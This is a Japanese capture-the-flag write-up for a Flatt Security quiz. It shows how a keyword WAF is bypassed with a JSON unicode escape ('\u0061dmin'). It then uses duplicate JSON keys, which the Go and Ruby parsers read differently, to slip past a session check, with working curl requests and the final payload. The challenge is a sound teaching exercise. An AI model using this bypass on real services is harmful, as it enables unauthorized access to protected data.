# Flatt Security Developers' Quiz #6

今回のアプリケーションは、簡単な投票アプリでした。アプリケーションの構成は Nginx → Go → Ruby の二重プロキシだった。名前からわかるように、Ruby のアプリケーションは `legacy` という名前のディレクトリに入っているので、おそらくよくある、他の言語で書かれたコードベースがあるけど開発体験をよくするためにアプリケーションの一部を他の言語で書き換え、一部の API はプロキシするよくあるアプリケーションの構成だろう。

普通に使って脆弱性を発見できるとは思わないので、とりあえずソースコードを読んでみると、Nginx は特におもしろいことが書かれてなかったです。Ruby 部分にはフラグあって、`/result` を使うと取得できる。ここでは認証が実装されていないので、おそらく Go の認証を突破すればよさそう。該当部分のコードは以下である。

```rb
post '/result' do
  d = request.body.read
  data = JSON.parse(d)
  username = data['username']
  candidate = users[username]

  if candidate
    json candidate: candidate
  else
    status 403
    json error: "User not found"
  end
end
```

そうすると Go の部分をみる。まず、waf という名前の関数が aru.

```go
func waf(data []byte) bool {
	return bytes.Contains(data, []byte("admin"))
}
```

`{ "name": "admin" }` は書けないが、[RFC 8259 Section 7](https://datatracker.ietf.org/doc/html/rfc8259#section-7) を読むと

```
char = unescaped /
    escape (
        %x22 /          ; "    quotation mark  U+0022
        %x5C /          ; \    reverse solidus U+005C
        %x2F /          ; /    solidus         U+002F
        %x62 /          ; b    backspace       U+0008
        %x66 /          ; f    form feed       U+000C
        %x6E /          ; n    line feed       U+000A
        %x72 /          ; r    carriage return U+000D
        %x74 /          ; t    tab             U+0009
        %x75 4HEXDIG )  ; uXXXX                U+XXXX

escape = %x5C              ; \
```

が書いてあるので、`{ "name": "\u0061dmin" }` は書けます。これだけでは解けないので続きを読みましょう。

```go
func handleSession(c echo.Context, data []byte) error {
	if waf(data) {
		return echo.NewHTTPError(http.StatusBadRequest, "Bad text detected")
	}

	sessionID := c.Request().Header.Get("Authorization")
	username, err := jsonparser.GetString(data, "username")
	if err != nil {
		return echo.NewHTTPError(http.StatusBadRequest, "username is required")
	}

	if _, exists := userSessions[username]; !exists {
		return echo.NewHTTPError(http.StatusUnauthorized, "Invalid session")
	}
	if userSessions[username] != sessionID {
		return echo.NewHTTPError(http.StatusUnauthorized, "Invalid session")
	}

	return nil
}
```

ここで `body` の `username` に対応する `sesion` が `Authorization` の値に一致しなければならない。ここで普通にアプリケーションにアクセスし、とりあえず適当に `southball`, `123` で登録する。

![ログイン画面のスクリーンショット](./Screenshot%20Login.png)

元々叩きたかった `/result` にプロキシするエンドポイントを読む。`bytes.NewBuffer(data)` で渡しているので、リクエストボディがそのまま渡されている。

```go
func postResult(c echo.Context) error {
	data, err := io.ReadAll(c.Request().Body)
	if err != nil {
		return echo.NewHTTPError(http.StatusInternalServerError, err.Error())
	}

	if err := handleSession(c, data); err != nil {
		return err
	}

	resp, err := http.Post("http://"+legacyHost+"/result", "application/json", bytes.NewBuffer(data))
	if err != nil {
		return echo.NewHTTPError(http.StatusInternalServerError, err.Error())
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return echo.NewHTTPError(http.StatusInternalServerError, err.Error())
	}

	return c.JSONBlob(resp.StatusCode, body)
}
```

今までわかったことをまとめると

- `waf` を突破する
- `handleSession` と突破する
  と、`/result` にアクセスできる。実際、先ほど登録したアカウントで一回投票して、`/result` を叩いてみるとこうなる。

```sh
$ curl -XPOST -H 'Authorization: 123' https://202312-giraffe-33ab414.quiz.flatt.training/result --data '{"username":"southball"}'
{"candidate":"Giraffe"}
```

`username` を `admin` にしたら `waf` で落ちる。

```sh
$ curl -XPOST -H 'Authorization: 123' https://202312-giraffe-33ab414.quiz.flatt.training/result --data '{"username":"admin"}'
{"message":"Bad text detected"}
```

`\\u0061dmin` にしたら `handleSession` で落ちる。

```sh
curl -XPOST -H 'Authorization: 123' https://202312-giraffe-33ab414.quiz.flatt.training/result --data '{"username":"\u0061dmin"}'
{"message":"Invalid session"}
```

ここで、最終的に解けるまであと一つのトリックが必要で、[JSON Interoperability Vulnerabilities の概要](https://techblog.securesky-tech.com/entry/2023/04/20/) という記事で説明されている。今回フラグを取得するためのペイロードは

```json
{ "username": "southball", "username": "\u0061dmin" }
```

である。Go では `username` が `"southball"` になり、Ruby では `username` が `"\u0061dmin"` になる。実際叩いてみると、

```sh
curl -XPOST -H 'Authorization: 123' https://202312-giraffe-33ab414.quiz.flatt.training/result --data '{"username":"southball","username":"\u0061dmin"}'
{"candidate":"Flatt{Secure X means the system is not secure}"}
```

になる。これで今回のクイズが解けた。
